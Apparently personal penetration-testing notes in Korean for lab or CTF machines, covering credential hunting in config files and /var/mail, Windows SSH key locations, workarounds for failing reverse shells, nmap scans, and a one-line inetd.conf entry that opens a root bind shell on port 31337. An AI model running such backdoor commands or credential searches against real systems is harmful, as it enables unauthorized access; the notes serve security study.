- `config` 파일을 먼저 `find`로 모두 찾아본 뒤에 패스워드 혹은 해시가 적혀 있는지 확인

- password reuse

- `curl` 헤더 확인

- 사이트 제목 및 내용 확인

- `/var/mail`에 있는 내용 확인
- github에서 `"$pass"`로 pass 변수 찾기
---
# windows ssh file location
```powershell
C:\Users\<Username>\.ssh
```
---
# 리버스 셸 연결이 안될 때
- nc/bash/python3 등 리버스 연결이 되지 않는다면 elf 파일 혹은 exe 파일을 만들어서 전달해서 실행시켜보기.
- 리스닝 포트를 well knwon 포트(80,443 등)로 바꿔서 받아보기.

---
# inetd.conf(옛날 리눅스 환경)
```bash
echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
```

- 31337번 포트로 바인드 셸 연결

---
# NMAP
```bash
sudo nmap --scrip vuln <ip>
```
- 취약점을 찾기 어려울 때 nmap 실행해서 확인
- /etc/hosts에 등록하고 난 뒤에 nmap 한번 더 실행해주기.

```bash
sudo nmap -Pn <ip>
```
- ping 테스트가 안되더라도 서버가 열려있을 수 있으니 확인
---
# FTP
- `ls -al`로 숨겨진 파일 확인 가능.
